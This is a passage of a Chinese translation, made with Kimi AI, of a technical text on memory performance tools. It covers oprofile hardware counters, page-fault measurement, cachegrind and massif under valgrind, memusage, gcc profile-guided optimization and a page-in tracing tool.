    <content type="html"><![CDATA[<p>内存分析工具</p><span id="more"></span><p>** 注：这篇文章是使用 <code>Kimi AI</code> 进行翻译的**</p><h2 id="7-内存性能工具"><a href="#7-内存性能工具" class="headerlink" title="7 内存性能工具"></a>7 内存性能工具</h2><p>有多种工具可供程序员使用，以帮助他们理解程序的缓存和内存使用情况。现代处理器拥有可以利用的性能监控硬件。有些事件难以精确测量，因此也有模拟的空间。当涉及到更高级的功能时，有特殊工具可以监控进程的执行。我们将介绍大多数 Linux 系统上可用的一组常用工具。</p><h3 id="7-1-内存操作分析"><a href="#7-1-内存操作分析" class="headerlink" title="7.1 内存操作分析"></a>7.1 内存操作分析</h3><p>分析内存操作需要硬件的协作。单独的软件可以收集一些信息，但这要么是粗粒度的，或者仅仅是模拟。第 7.2 节和第 7.5 节将展示模拟的示例。这里我们将专注于可测量的内存效应。</p><p>在 Linux 上，oprofile 提供了对性能监控硬件的访问。Oprofile 提供了首次在 [continuous] 中描述的持续分析功能；它执行统计学上的系统级分析，并具有易于使用的界面。Oprofile 绝不是使用处理器性能测量功能的唯一方法；Linux 开发者正在开发 pfmon，这可能在某个时候被广泛部署，也值得在这里描述。</p><p>oprofile 提供的界面简单且最小化，但也是相当低级的，即使使用了可选的 GUI。用户必须在处理器可以记录的事件中进行选择。处理器的架构手册描述了这些事件，但通常需要对处理器本身有广泛的了解才能解释数据。另一个问题是收集到的数据的解释。性能测量计数器是绝对值，并且可以任意增长。对于给定的计数器，多高才算太高？</p><p>这个问题的部分答案是避免查看绝对值，而是将多个计数器相互关联。处理器可以监控多个事件；然后可以检查收集到的绝对值的比率。这给出了不错的、可比较的结果。通常，除数是处理时间的度量，时钟周期数或指令数。作为程序性能的初步尝试，仅通过这两个数字本身的关系是有用的。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292143872.png"></p><p>图 7.1 显示了各种工作集大小的简单随机“Follow”测试案例的每条指令所需周期数（CPI）。对于大多数 Intel 处理器，收集这些信息的事件名称是 <code>CPU_CLK_UNHALTED</code> 和 <code>INST_RETIRED</code>。正如名称所暗示的，前者计算 CPU 的时钟周期，后者计算指令的数量。我们看到的图像类似于我们使用的每个列表元素的周期数测量。对于小的工作集大小，比率是 1.0 或甚至更低。这些测量是在 Intel Core 2 处理器上进行的，该处理器是多标量的，可以同时处理多个指令。对于不受内存带宽限制的程序，比率可以显著低于 1.0，但在这种情况下，1.0 已经相当不错了。</p><p>一旦 L1d 不再足够大以容纳工作集，CPI 跳升到略低于 3.0。请注意，CPI 比率平均了所有指令访问 L2 的惩罚，而不仅仅是内存指令。使用列表元素数据的周期数，可以计算出每个列表元素需要多少条指令。如果甚至 L2 缓存也不够，CPI 比率跳升到超过 20。这些是预期的结果。</p><p>但是，性能测量计数器应该提供更多关于处理器内部发生了什么的洞察。为此我们需要考虑处理器实现的细节。在本文档中，我们关注的是缓存处理细节，因此我们必须查看与缓存相关的事件。这些事件、它们的名称以及它们的计数是特定于处理器的。这是 oprofile 目前难以使用的地方，无论用户界面多么简单：用户必须自己弄清楚性能计数器的细节。在第 10 节中，我们将看到有关一些处理器的详细信息。</p><p>对于 Core 2 处理器，要查找的事件是 <code>L1D_REPL</code>、<code>DTLB_MISSES</code> 和 <code>L2_LINES_IN</code>。后者可以测量所有未命中以及由指令而不是硬件预取引起的未命中。随机“Follow”测试的结果可以在图 7.2 中看到。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292144592.png"></p><p>图 7.2 显示了使用退休指令数（<code>INST_RETIRED</code>）计算的所有比率。这意味着也计算了不触及内存的指令，这意味着实际上遭受缓存未命中的触及内存的指令数量甚至比图中显示的还要高。</p><p>L1d 未命中在所有其他未命中中占据主导地位，因为对于 Intel 处理器来说，L2 未命中意味着由于使用包容性缓存，也会发生 L1d 未命中。处理器有 32k 的 L1d，因此我们如预期地看到，当工作集大小大约在那个大小时（除了列表数据结构之外，还有其他使用缓存的情况，这意味着增长发生在 16k 和 32k 标记之间），L1d 速率从零上升。有趣的是，硬件预取可以在工作集大小达到并包括 64k 时，将未命中率保持在 1%。在此之后，L1d 速率急剧上升。</p><p>L2 未命中率在 L2 耗尽之前一直保持为零；由于 L2 的其他用途引起的少数未命中对数字影响不大。一旦超过 L2 的大小（221 字节），未命中率上升。重要的是要注意，L2 需求未命中率非零。这表明硬件预取器没有加载所有后来指令所需的缓存行。这是预期的，访问的随机性阻止了完美的预取。将此与图 7.3 中顺序读取的数据进行比较。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292144921.png"></p><p>图 7.3 显示了 L2 需求未命中率基本上为零（请注意，此图的比例与图 7.2 不同）。对于顺序访问情况，硬件预取器工作得非常好：几乎所有的 L2 缓存未命中都是由预取器引起的。L1d 和 L2 未命中率相同这一事实表明，所有 L1d 缓存未命中都由 L2 缓存处理，没有进一步的延迟。这是所有程序的理想情况，但当然，几乎永远无法实现。</p><p>两个图中的第四行是 DTLB 未命中率（Intel 为代码和数据分别有单独的 TLB，DTLB 是数据 TLB）。对于随机访问情况，DTLB 未命中率是显著的，并且导致了延迟。有趣的是，DTLB 惩罚在 L2 未命中之前就开始了。对于顺序访问情况，DTLB 成本基本上为零。</p><p>回到第 6.2.1 节中的矩阵乘法示例和第 9.1 节中的示例代码，我们可以使用三个更多的计数器。<code>SSE_PRE_MISS</code>、<code>SSE_PRE_EXEC</code> 和 <code>LOAD_HIT_PRE</code> 计数器可以用来查看软件预取的效果如何。如果运行第 9.1 节中的代码，我们得到以下结果：</p><table><thead><tr><th>描述</th><th>比率</th></tr></thead><tbody><tr><td>有用的 NTA 预取</td><td>2.84%</td></tr><tr><td>晚期 NTA 预取</td><td>2.65%</td></tr></tbody></table><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292145859.png"></p><p>低有用的 NTA（非临时对齐）预取比率表明，许多预取指令被执行用于已经加载的缓存行，因此不需要工作。这意味着处理器浪费时间解码预取指令并查找缓存。不过，也不能太严厉地评判代码。很大程度上取决于使用的处理器的缓存大小；硬件预取器也起作用。</p><p>低晚期 NTA 预取比率是误导的。该比率意味着 2.65% 的所有预取指令发出得太晚了。需要数据的指令在数据能够预取到缓存之前就已经执行了。必须记住，只有 2.84%+2.65%&#x3D;5.5% 的预取指令有任何用处。在有用的 NTA 预取指令中，有 48% 没有及时完成。因此，代码可以进一步优化：</p><ul><li>大多数预取指令并不需要。</li><li>预取指令的使用可以调整以更好地匹配硬件。</li></ul><p>留给读者作为练习，确定对可用硬件的最佳解决方案。确切的硬件规格起着重要作用。在 Core 2 处理器上，SSE 算术操作的延迟是 1 个周期。旧版本有 2 个周期的延迟，这意味着硬件预取器和预取指令有更多的时间来引入数据。</p><p>要确定可能需要预取的地方——或者预取是不必要的——可以使用 opannotate 程序。它列出了程序的源代码或汇编代码，并显示了识别事件的指令。请注意，有两个模糊的来源：</p><ol><li><p>Oprofile 执行随机分析。为了避免过多地减慢系统的运行速度，只有每 N 个事件（其中 N 是每个事件的阈值，有强制的最小值）被记录。可能会有导致 100 个事件的行，但它们可能根本不会出现在报告中。</p></li><li><p>并非所有事件都被准确记录。例如，记录特定事件时的指令计数器可能是错误的。处理器是多标量的，很难给出 100% 正确的答案。然而，一些处理器上的一些事件是准确的。</p></li></ol><p>注释列表对于确定预取信息很有用。每个事件都带有指令指针；因此，还可以精确定位程序中的其他热点。许多 <code>INST_RETIRED</code> 事件的来源被频繁执行，值得调整。报告许多缓存未命中的位置可能需要一个预取指令来避免缓存未命中。</p><p>可以在没有硬件支持的情况下测量的一种事件是页面错误。操作系统负责解决页面错误，在这些场合，它也会计算它们。它区分两种类型的页面错误：</p><ul><li><p><strong>次要页面错误</strong> 这些是匿名（即，不是文件支持的）页面的页面错误，这些页面尚未使用，对于副本上写时的页面，以及其内容已经在某个内存中的其他页面。</p></li><li><p><strong>主要页面错误</strong> 解决它们需要访问磁盘以检索文件支持（或交换出的）数据。</p></li></ul><p>显然，主要页面错误比次要页面错误要昂贵得多。但后者也不便宜。在任何情况下，都需要进入内核，必须找到一个新的页面，页面必须被清除或用适当的数据填充，并且必须相应地修改页面表树。最后一个步骤需要与读取或修改页面表树的其他任务同步，这可能会引入进一步的延迟。</p><p>获取页面错误计数信息的最简单方法是使用 time 工具。注意：使用真正的工具，而不是 shell 内置命令。输出可以在图 7.4 中看到。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292145462.png"><br>图 7.4：time 实用程序的输出</p><p>这里有趣的部分是最后一行。time 工具报告了一个主要和 335 个次要页面错误。确切的数字会变化；特别是，立即重复运行可能会显示现在根本没有主要页面错误。如果程序执行相同的操作，并且环境中没有任何变化，那么总页面错误计数将保持稳定。</p><p>程序启动是一个特别敏感的阶段，因为使用每个页面都会产生页面错误；可见的效果（特别是对于 GUI 应用程序）是使用的页面越多，程序开始工作所需的时间就越长。在第 7.5 节中，我们将看到一种专门测量这种效果的工具。</p><p>在幕后，time 工具使用了 <code>rusage</code> 功能。<code>wait4</code> 系统调用在父进程等待子进程终止时填充一个 <code>struct rusage</code> 对象；这正是 time 工具所需要的。但进程也可以请求有关其自身资源使用情况的信息（这就是 <code>rusage</code> 名称的由来）或其已终止子进程的资源使用情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getrusage</span><span class="hljs-params">(<span class="hljs-type">__rusage_who_t</span> who, <span class="hljs-keyword">struct</span> rusage *usage)</span><br></code></pre></td></tr></table></figure><p><code>who</code> 参数指定请求信息的进程。目前，定义了 <code>RUSAGE_SELF</code> 和 <code>RUSAGE_CHILDREN</code>。子进程的资源使用情况在每个子进程终止时累积。这是一个总值，而不是单个子进程的使用情况。存在允许请求特定线程信息的提议，因此我们可能在不久的将来看到 <code>RUSAGE_THREAD</code>。<code>rusage</code> 结构被定义为包含各种指标，包括执行时间、发送的 IPC 消息数、使用的内存以及页面错误数。后者信息可在结构的 <code>ru_minflt</code> 和 <code>ru_majflt</code> 成员中获取。</p><p>试图确定程序因页面错误而失去性能的程序员可以定期请求信息，然后将返回的值与先前的结果进行比较。</p><p>从外部，如果请求者具有必要的权限，信息也是可见的。伪文件 <code>/proc/&lt;PID&gt;/stat</code>，其中 <code>&lt;PID&gt;</code> 是我们感兴趣的进程的进程 ID，包含在第十到第十四个字段中的页面错误数。它们是进程及其子进程的累积次要和主要页面错误的对。</p><h3 id="7-2-模拟-CPU-缓存"><a href="#7-2-模拟-CPU-缓存" class="headerlink" title="7.2 模拟 CPU 缓存"></a>7.2 模拟 CPU 缓存</h3><p>虽然缓存工作的技术描述相对容易理解，但实际程序如何使用缓存却不容易看出。程序员并不直接关心地址值，无论是绝对的还是相对的。地址部分由链接器确定，在运行时由动态链接器和内核确定。生成的汇编代码预计将使用所有可能的地址工作，而在源语言中，甚至没有绝对地址值的提示。因此，可能很难了解程序如何使用内存。{ <em>当靠近硬件编程时，这可能有所不同，但这不关系到正常编程，无论如何，只能对特殊地址如内存映射设备才有可能。</em>}</p><p>像 oprofile（如第 7.1 节所述）这样的 CPU 级分析工具可以帮助理解缓存使用。生成的数据对应于实际硬件，如果不需要细粒度收集，可以相对快速地收集。一旦需要更细粒度的数据，oprofile 就不再可用了；线程将不得不被频繁中断。此外，要查看程序在不同处理器上的内存行为，实际上必须拥有这样的机器并在它们上面执行程序。这有时（经常）是不可能的。一个例子是图 3.8 中的数据。要使用 oprofile 收集这些数据，将需要 24 台不同的机器，其中许多机器并不存在。</p><p>该图中的数据是使用缓存模拟器收集的。这个程序，cachegrind，使用最初是为了检查程序中的内存处理相关问题而开发的 valgrind 框架。valgrind 框架模拟程序的执行，并在此过程中允许各种扩展，如 cachegrind，钩入执行框架。cachegrind 利用此功能拦截所有内存地址的使用；然后它模拟给定大小、缓存行大小和关联性的 L1i、L1d 和 L2 缓存的操作。</p><p>要使用该工具，必须使用 valgrind 作为包装器运行程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">valgrind --tool=cachegrind command arg<br></code></pre></td></tr></table></figure><p>在这种最简单的形式中，程序 <code>command</code> 在模拟三个缓存时使用参数 <code>arg</code> 执行，这些缓存的大小和关联性对应于它正在运行的处理器的大小和关联性。程序运行时打印出的一部分输出显示在标准错误上；它包含如图 7.5 所示的总缓存使用情况的统计信息。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292145169.png"><br>图 7.5：cachegrind 汇总输出</p><p>提供了指令的总数和内存引用的次数，以及它们在 L1i&#x2F;L1d 和 L2 缓存中产生的未命中次数、未命中率等信息。该工具甚至能够将 L2 访问分为指令访问和数据访问，并且所有数据缓存的使用都分为读访问和写访问。</p><p>当模拟缓存的细节被改变并且比较结果时，情况变得更加有趣。通过使用 <code>-I1</code>、<code>-D1</code> 和 <code>-L2</code> 参数，可以指示 <code>cachegrind</code> 忽略处理器的缓存布局，并使用命令行指定的布局。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">valgrind --tool=cachegrind --L2=8388608,8,64 <span class="hljs-built_in">command</span> arg<br></code></pre></td></tr></table></figure><p>这将模拟一个具有 8MB 容量、8路集合关联和 64 字节缓存行大小的 L2 缓存。请注意，<code>-L2</code> 选项在命令行上出现在被模拟程序的名称之前。</p><p>这并不是 <code>cachegrind</code> 能做的全部。在进程退出之前，<code>cachegrind</code> 会写入一个名为 <code>cachegrind.out.XXXXX</code> 的文件，其中 <code>XXXXX</code> 是进程的 PID。该文件包含了关于每个函数和源文件中缓存使用的摘要信息和详细信息。可以使用 <code>cg_annotate</code> 程序查看这些数据。</p><p>这个程序产生的输出包含了进程终止时打印的缓存使用摘要，以及程序中每个函数的缓存行使用的详细摘要。生成这种按函数的数据需要 <code>cg_annotate</code> 能够将地址匹配到函数。这意味着为了获得最佳结果，应该提供调试信息。如果没有调试信息，ELF 符号表也能提供一些帮助，但由于内部符号没有列在动态符号表中，结果不会是完整的。图 7.6 显示了与图 7.5 中相同程序运行的部分输出。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292150274.png"></p><p>Ir、Dr 和 Dw 列显示的是总的缓存使用情况，而不是缓存未命中，缓存未命中显示在接下来的两列中。这些数据可以用来识别产生最多缓存未命中的代码。首先，人们可能会集中关注 L2 缓存未命中，然后着手优化 L1i&#x2F;L1d 缓存未命中。</p><p>cg_annotate 可以提供更详细的数据。如果提供了源文件的名称，它还会注释（这也是程序名称的由来）源文件的每一行，显示对应于该行的缓存命中和未命中次数。这些信息允许程序员深入到缓存未命中成为问题的确切行。程序界面有点原始：截至撰写本文时，cachegrind 数据文件和源文件必须位于同一目录中。</p><p>在这一点上，应该再次指出：cachegrind 是一个模拟器，它不使用来自处理器的测量数据。处理器中的实际缓存实现可能完全不同。cachegrind 模拟了最近最少使用（LRU）替换策略，这对于具有较大关联性的缓存来说可能成本过高。此外，模拟没有考虑上下文切换和系统调用，这两者都可以破坏大量 L2 缓存，并必须清空 L1i 和 L1d。这导致总的缓存未命中数比实际体验中要低。尽管如此，cachegrind 是一个了解程序内存使用情况及其内存问题的好工具。</p><h3 id="7-3-测量内存使用情况"><a href="#7-3-测量内存使用情况" class="headerlink" title="7.3 测量内存使用情况"></a>7.3 测量内存使用情况</h3><p>知道程序分配了多少内存，以及可能在哪里发生分配，是优化其内存使用的第一步。幸运的是，有一些易于使用的程序可用，甚至不需要重新编译或特别修改程序。</p><p>对于第一个工具，称为 massif，只需不剥离编译器可以自动生成的调试信息即可。它提供了随时间累积的内存使用情况的概览。图 7.7 显示了一个示例输出。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292146289.png"><br>图 7.7：Massif 输出</p><p>像 cachegrind（第 7.2 节）一样，massif 是一个使用 valgrind 基础设施的工具。它通过以下方式启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">valgrind --tool=massif command arg<br></code></pre></td></tr></table></figure><p>这里的 <code>command arg</code> 是被观察的程序及其参数。程序将被模拟，并且所有对内存分配函数的调用都被识别出来。记录调用站点以及时间戳值；新分配的大小将同时添加到整个程序的总数和特定调用站点的总数中。同样适用于释放内存的函数，显然，释放的块的大小将从相应的总和中减去。然后，这些信息可以用来创建一个显示程序生命周期内内存使用的图表，根据请求分配的位置分割每个时间值。在进程终止之前，massif 创建两个文件：<code>massif.XXXXX.txt</code> 和 <code>massif.XXXXX.ps</code>，其中 <code>XXXXX</code> 在这两种情况下都是进程的 PID。<code>.txt</code> 文件是所有调用站点内存使用情况的摘要，<code>.ps</code> 是图 7.7 中可以看到的内容。</p><p>Massif 还可以记录程序的栈使用情况，这有助于确定应用程序的总内存占用。但这并不总是可能的。在某些情况下（一些线程栈或当使用 <code>signalstack</code> 时），valgrind 运行时无法知道栈的限制。在这些情况下，将这些栈的大小添加到总数中也没有太多意义。还有一些其他情况，这样做没有意义。如果程序受到影响，应该使用附加选项 <code>—stacks=no</code> 启动 massif。请注意，这是 valgrind 的一个选项，因此必须在被观察程序的名称之前。 </p><p>一些程序提供自己的内存分配函数或围绕系统分配函数的包装函数。在第一种情况下，通常遗漏分配；在第二种情况下，记录的调用站点隐藏了信息，因为只记录了包装函数中调用的地址。为此，可以将附加函数添加到分配函数列表中。<code>—alloc-fn=xmalloc</code> 参数将指定函数 <code>xmalloc</code> 也是分配函数，这在 GNU 程序中通常是这种情况。记录对 <code>xmalloc</code> 的调用，但不记录从 <code>xmalloc</code> 内部进行的分配调用。</p><p>第二个工具称为 memusage；它是 GNU C 库的一部分。它是 massif 的简化版本（但在 massif 之前很长时间就存在了）。它只记录堆的总内存使用情况（包括可能的 <code>mmap</code> 等调用，如果给出 <code>-m</code> 选项），以及可选的栈。结果可以显示为总内存使用情况随时间的图表，或者作为对分配函数调用的线性显示。图表由 memusage 脚本单独创建，就像 valgrind 一样，必须使用它来启动应用程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">memusage command arg<br></code></pre></td></tr></table></figure><p>必须使用 <code>-p IMGFILE</code> 选项指定应在文件 <code>IMGFILE</code> 中生成图表，它将是一个 PNG 文件。收集数据的代码在实际程序本身中运行，它不是像 valgrind 那样的模拟。这意味着 memusage 比 massif 快得多，并且可以在 massif 不太有用的情况下使用。除了总内存消耗外，代码还记录分配大小，程序终止时，它会显示使用的分配大小的直方图。此信息将写入标准错误。</p><p>有时，直接调用要观察的程序是不可能的（或不可行）。一个例子是 gcc 的编译器阶段，它由 gcc 驱动程序启动。在这种情况下，必须使用 <code>-n NAME</code> 参数向 memusage 脚本提供要观察的程序的名称。如果观察的程序启动了其他程序，此参数也很有用。如果没有指定程序名称，则将分析所有启动的程序。</p><p>massif 和 memusage 两个程序都有其他选项。发现自己需要更多功能的程序员应该首先查阅手册或帮助消息，以确保额外的功能尚未实现。</p><p>现在我们知道了如何捕获有关内存分配的数据，有必要讨论如何在内存和缓存使用的背景下解释这些数据。高效动态内存分配的主要方面是线性分配和使用部分的紧凑性。这归结于使预取高效和减少缓存未命中。</p><p>一个需要稍后处理任意数量数据的程序可以通过创建一个列表来完成，其中每个列表元素包含一个新的数据项。这种分配方法的开销可能很小（单个链表的一个指针），但使用数据时的缓存效应可能会显著降低性能。</p><p>一个问题是，例如，没有保证顺序分配的内存在内存中顺序布局。这有很多可能的原因：</p><ul><li>由内存分配器管理的大型内存块内的内存块实际上是从后向前返回的；</li><li>一个内存块耗尽，新的一块在地址空间的不同部分开始；</li><li>分配请求的大小不同，由不同的内存池提供；</li><li>多线程程序中分配的交错。</li></ul><p>如果必须预先分配数据以供以后处理，链表方法是明显不好的主意。没有保证（甚至可能性）列表中的连续元素在内存中连续布局。要确保连续分配，内存不能以小块分配。必须使用另一层内存处理；程序员可以轻松实现。另一种选择是使用 GNU C 库中提供的 obstack 实现。这个分配器从系统的分配器请求大块内存，然后任意大小的内存块。除非大型内存块耗尽，否则这些分配始终是顺序的，这取决于请求的分配大小，相当罕见。Obstacks 不是内存分配器的完整替代品，它们释放对象的能力有限。有关详细信息，请参阅 GNU C 库手册。</p><p>那么，如何从图表中识别出在这种情况下使用 obstacks（或类似技术）是明智的？如果不查看源代码，无法识别可能的候选变更，但图表可以为搜索提供入口点。如果从同一位置进行许多分配，这可能意味着批量分配可能会有所帮助。在图 7.7 中，我们可以看到在地址 0x4c0e7d5 处的分配是这样一个可能的候选者。从运行开始大约 800ms 到 1800ms，这是唯一增长的区域（除了顶部的绿色区域）。此外，斜率不陡峭，这意味着我们有大量的相对较小的分配。这确实是使用 obstacks 或类似技术候选者。</p><p>图表可以显示的另一个问题是分配的总数很高。如果图表不是随时间线性绘制的，而是随分配函数调用次数线性绘制的（这是 memusage 的默认设置），则图表中的缓坡意味着许多小分配。memusage 不会说分配发生在哪里，但与 massif 的输出比较可以说明这一点，或者程序员可能立即识别出来。许多小分配应该合并以实现线性内存使用。</p><p>但这还有另一个同样重要的方面：许多分配也意味着管理数据的开销更高。这本身可能不是问题。在 massif 图表中，名为“heap-admin”的红色区域表示这种开销，它相当小。但是，根据 <code>malloc</code> 的实现，这种管理数据是与数据块一起分配的，在同一内存中。对于 GNU C 库中当前的 <code>malloc</code> 实现，就是这种情况：每个分配的块至少有一个 2 个单词的头（32 位平台上为 8 字节，64 位平台上为 16 字节）。此外，由于内存管理的方式，块大小通常比必要的大一些（将块大小四舍五入到特定倍数）。</p><p>所有这些都意味着程序使用的内存与仅供分配器用于管理目的的内存交织在一起。我们可能会看到这样的东西：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292147756.png"></p><p>每个块代表一个内存字，在这段内存中，我们有四个已分配的块。由于块头和填充，开销为 50%。由于头的放置，这自动意味着处理器的有效预取率也降低了高达 50%。如果块顺序处理（以充分利用预取），处理器将读取所有头和填充字到缓存中，即使它们从不打算由应用程序本身读取或写入。只有运行时使用头字，运行时只有在块被释放时才起作用。</p><p>现在，有人可能会争论说，实现应该改变，将管理数据放在其他地方。这确实在一些实现中完成了，这可能证明是个好主意。然而，有许多方面需要考虑，安全性不是最不重要的。不管我们是否可能在未来看到变化，填充问题永远不会消失（在忽略头的情况下，示例中数据的填充量为 16%）。只有程序员直接控制分配，这才能避免。当对齐要求发挥作用时，可能仍然存在孔洞，但这也是程序员可以控制的事情。</p><h3 id="7-4-改进分支预测"><a href="#7-4-改进分支预测" class="headerlink" title="7.4 改进分支预测"></a>7.4 改进分支预测</h3><p>在第 6.2.2 节中，提到了两种通过分支预测和块重排序改进 L1i 用途的方法：使用 <code>__builtin_expect</code> 进行静态预测和基于配置文件的优化（PGO）。正确的分支预测对性能有影响，但在这里我们感兴趣的是内存使用改进。</p><p>使用 <code>__builtin_expect</code>（或更好的 <code>likely</code> 和 <code>unlikely</code> 宏）很简单。定义放在一个中心头文件中，编译器会处理其余的事情。但是有一个小问题：程序员很容易使用 <code>likely</code>，而实际上是 <code>unlikely</code>，反之亦然。即使有人使用像 oprofile 这样的工具来测量不正确的分支预测和 L1i 缺失，这些问题也很难检测到。</p><p>有一个简单的方法。第 9.2 节中的代码显示了 <code>likely</code> 和 <code>unlikely</code> 宏的替代定义，这些宏在运行时积极测量静态预测是否正确或不正确。然后，程序员或测试人员可以检查结果并进行调整。这些测量实际上并不考虑程序的性能，它们只是测试程序员所做的静态假设。更多细节可以在上述引用的节中找到，以及代码。</p><p>PGO 在当今的 gcc 中使用起来相当容易。不过，这是一个三步过程，必须满足某些要求。首先，所有源文件必须使用额外的 <code>-fprofile-generate</code> 选项进行编译。这个选项必须传递给所有编译运行和链接程序的命令。混合编译的对象文件，有和没有这个选项的，是可能的，但 PGO 对没有启用它的对象文件没有任何好处。</p><p>编译器生成的二进制文件行为正常，只是它明显更大、更慢，因为它记录（并发出）关于分支是否采取的所有种类的信息。编译器还为每个输入文件生成一个带有 <code>.gcno</code> 扩展名的文件。该文件包含与代码中的分支相关的信息。这些信息必须保留以备后用。</p><p>一旦程序二进制可用，就应该用它来运行一组代表性的工作负载。无论使用什么工作负载，最终的二进制文件都将被优化以很好地完成此任务。连续运行程序是可能的，通常也是必要的；所有运行都将有助于同一个输出文件。在程序终止之前，程序运行期间收集的数据将被写入带有 <code>.gcda</code> 扩展名的文件中。这些文件是在包含源文件的目录中创建的。程序可以从任何目录执行，二进制文件可以复制，但必须有源代码的目录可用且可写。再次，每个输入源文件都会创建一个输出文件。如果程序运行多次，重要的是之前的运行的 <code>.gcda</code> 文件在源目录中找到，因为否则运行的数据不能累积在一个文件中。</p><p>当一组代表性的测试运行完成后，是时候重新编译应用程序了。编译器必须能够在保存源文件的同一目录中找到 <code>.gcda</code> 文件。这些文件不能移动，因为编译器将找不到它们，嵌入在文件中的校验和也不再匹配。对于重新编译，将 <code>-fprofile-generate</code> 参数替换为 <code>-fprofile-use</code>。至关重要的是，源代码不能以任何方式更改，这将改变生成的代码。这意味着：更改空格和编辑注释是没问题的，但添加更多的分支或基本块会使收集的数据无效，编译将失败。</p><p>这是程序员所需要做的全部；这是一个相当简单的过程。最重要的是进行测量的代表性测试的选择。如果测试工作负载与程序实际使用的方式不匹配，执行的优化实际上可能会造成更多的伤害而不是好处。因此，通常很难对库使用 PGO。库可以在许多——有时差异很大——的场景中使用。除非用例确实相似，否则通常最好完全依赖于使用 <code>__builtin_expect</code> 的静态分支预测。</p><p>关于 <code>.gcno</code> 和 <code>.gcda</code> 文件的一些话。这些是二进制文件，不能立即用于检查。然而，可以使用 gcov 工具（也是 gcc 包的一部分）来检查它们。</p><p>这个工具主要用于覆盖率分析（因此得名），但使用的文件格式与 PGO 相同。gcov 工具为每个具有执行代码的源文件生成带有 <code>.gcov</code> 扩展名的输出文件（这可能包括系统头文件）。这些文件是源列表，根据给定给 gcov 的参数，带有分支计数器、概率等注释。</p><h3 id="7-5-页面错误优化"><a href="#7-5-页面错误优化" class="headerlink" title="7.5 页面错误优化"></a>7.5 页面错误优化</h3><p>在像 Linux 这样的按需分页操作系统上，<code>mmap</code> 调用仅修改页面表。它确保对于文件支持的页面，可以找到底层数据，并且对于匿名内存，在访问时提供初始化为零的页面。在 <code>mmap</code> 调用时，实际上并没有分配内存。{ <em>如果你想说“错误！”请等一等，稍后将说明有</em> 例外。}</p><p>分配部分发生在内存页面首次访问时，无论是通过读取或写入数据，还是通过执行代码。在随后的页面错误响应中，内核接管控制，并使用页面表树确定必须出现在页面上的数据。这种页面错误的解决并不便宜，但它发生在进程使用的每个页面上。</p><p>为了最小化页面错误的代价，必须减少使用的页面总数。优化代码大小将有助于这一点。为了减少特定代码路径的成本（例如，启动代码），也可以重新排列代码，以便在该代码路径中，触摸的页面数量最小化。然而，确定正确的顺序并不容易。</p><p>作者编写了一个基于 valgrind 工具集的工具来测量页面错误，因为它们发生。不是页面错误的数量，而是它们发生的原因。pagein 工具发出有关页面错误顺序和时间的信息。输出写入名为 <code>pagein.&lt;PID&gt;</code> 的文件，看起来像图 7.8。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292147422.png"><br>图 7.8：pagein 工具的输出</p><p>第二列指定了被分页的页面的地址。第三列包含 <code>C</code> 或 <code>D</code>，分别表示它是否是代码或数据页面。第四列指定了自第一个页面错误以来经过的周期数。行的其余部分是 valgrind 尝试为导致页面错误的地址找到名称。地址值本身是正确的，但如果没有调试信息，名称可能不总是准确的。</p><p>在图 7.8 中的示例中，执行从地址 0x3000000B50 开始，这迫使地址为 0x3000000000 的页面被分页。不久之后，这个页面之后的页面也被带入；在该页面上调用的函数是 <code>_dl_start</code>。初始代码访问了页面 0x7FF000000 上的一个变量。这发生在第一个页面错误后的 3,320 个周期，并且很可能是程序的第二条指令（就在第一条指令之后的三个字节）。如果查看程序，会注意到这个内存访问有些奇特。问题中的指令是一个 <code>call</code> 指令，它没有显式地加载或存储数据。但它确实在栈上存储了返回地址，这里正是发生的情况。这不是进程的官方栈，而是 valgrind 的内部应用栈。这意味着在解释 pagein 的结果时，重要的是要记住 valgrind 引入了一些工件。</p><p>pagein 的输出可以用来确定程序代码中哪些代码序列理想地应该是相邻的。快速查看 <code>/lib64/ld-2.5.so</code> 代码显示，第一条指令立即调用函数 <code>_dl_start</code>，这两个地方在不同的页面上。将代码重新排列，将代码序列移动到同一个页面上，可以避免——或者至少延迟——页面错误。到目前为止，确定最佳代码布局是一个繁琐的过程。由于第二次使用页面并没有被设计为被记录，因此需要使用试错法来查看更改的效果。使用调用图分析，可以猜测可能的调用序列；这可能会帮助加快排序函数和变量的过程。</p><p>在非常粗略的层面上，可以通过查看构成可执行文件或 DSO 的对象文件来查看调用序列。从一个或多个入口点（即，函数名）开始，可以计算依赖链。在对象文件级别，这很容易实现。在每一轮中，确定包含所需函数和变量的对象文件。种子集必须明确指定。然后确定那些对象文件中所有未定义的引用，并将它们添加到所需符号的集合中。重复，直到集合稳定。</p><p>这个过程的第二步是确定一个顺序。各种对象文件必须组合在一起，以填充尽可能少的页面。作为额外的奖励，没有函数应该跨越页面边界。在所有这一切中的一个复杂性是，为了最好地安排对象文件，必须知道链接器以后会做什么。这里的重要事实是，链接器将按照输入文件（例如，归档文件）和命令行中出现的顺序，将对象文件放入可执行文件或 DSO 